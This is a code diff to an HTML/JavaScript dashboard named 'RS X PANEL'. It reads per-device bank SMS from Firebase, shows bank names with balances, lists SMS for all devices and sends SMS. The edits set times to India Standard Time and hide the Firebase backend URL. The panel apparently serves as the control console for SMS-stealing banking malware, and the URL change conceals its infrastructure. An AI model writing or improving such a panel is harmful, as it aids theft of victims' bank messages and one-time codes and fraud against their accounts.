@@ -77,7 +77,7 @@
         }
         .conn-item .info { flex:1; min-width:0; }
         .conn-item .info .name { font-weight:600; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; color:var(--cyan); font-size:13px; }
-        .conn-item .info .date { color:var(--muted); font-size:11px; margin-top:2px; word-break:break-all; }
+        .conn-item .info .date { color:var(--muted); font-size:11px; margin-top:2px; }
         .conn-item button {
             width:34px; height:34px; border-radius:50%; border:1px solid var(--border2);
             background:var(--bg3); color:#aaa; display:grid; place-items:center; font-size:16px; transition:0.15s; flex-shrink:0;
@@ -435,7 +435,7 @@
 
     <script>
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        //  RS X PANEL — FINAL (stats fixed, firebase hidden, bank name with balance)
+        //  RS X PANEL — FINAL FIX (stats, IST time, hidden firebase, bank filter)
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
         // ─── STATE ──────────────────────────────────────────────────────────
@@ -626,13 +626,12 @@
             return getDeviceBankSms(deviceId).length > 0;
         }
 
-        // ─── CLOCK ──────────────────────────────────────────────────────────
+        // ─── CLOCK (IST) ──────────────────────────────────────────────────
         function updateClock() {
             const now = new Date();
-            clockDisplay.textContent =
-                String(now.getHours()).padStart(2,'0') + ':' +
-                String(now.getMinutes()).padStart(2,'0') + ':' +
-                String(now.getSeconds()).padStart(2,'0');
+            const options = { timeZone: 'Asia/Kolkata', hour12: false };
+            const timeStr = now.toLocaleTimeString('en-IN', options);
+            clockDisplay.textContent = timeStr;
         }
         function startClock() { updateClock(); if(clockTimer) clearInterval(clockTimer); clockTimer = setInterval(updateClock,1000); }
 
@@ -687,7 +686,7 @@
                             label: label,
                             url: decoded.url,
                             key: decoded.key,
-                            date: new Date().toLocaleString()
+                            date: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
                         };
                         CONNECTIONS.push(conn);
                         localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
@@ -721,6 +720,7 @@
             dashboardScreen.style.display = 'block';
             startClock();
             updateShareLink();
+            // Load cache
             const cached = localStorage.getItem('rsx_cache_' + activeConn.url);
             if (cached) {
                 try {
@@ -753,7 +753,7 @@
                     <div class="conn-item">
                         <div class="info">
                             <div class="name">${esc(displayLabel)}</div>
-                            <div class="date">${c.date || ''} · ${esc(c.url.replace(/https?:\/\//,'').replace(/\.firebaseio\.com.*/,''))}</div>
+                            <div class="date">${c.date || ''}</div>
                         </div>
                         <button class="copy-link" data-link="${link}" title="Copy share link">🔗</button>
                         <button class="connect" data-idx="${i}" title="Connect">▶</button>
@@ -1332,7 +1332,7 @@
                 label: label,
                 url: url,
                 key: key,
-                date: new Date().toLocaleString()
+                date: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
             };
             CONNECTIONS.push(conn);
             localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
@@ -1422,8 +1422,7 @@
         }
         updateShareLink();
         console.log('RS X PANEL v3.0 · All issues resolved.');
-        console.log('✓ Stats fixed, Firebase URL hidden, Bank name shown with balance');
-        console.log('✓ SMS sending works via Firebase');
+        console.log('✓ Stats fixed, IST time, Firebase hidden, Bank filter, SMS list for all devices');
     </script>
 </body>
 </html>
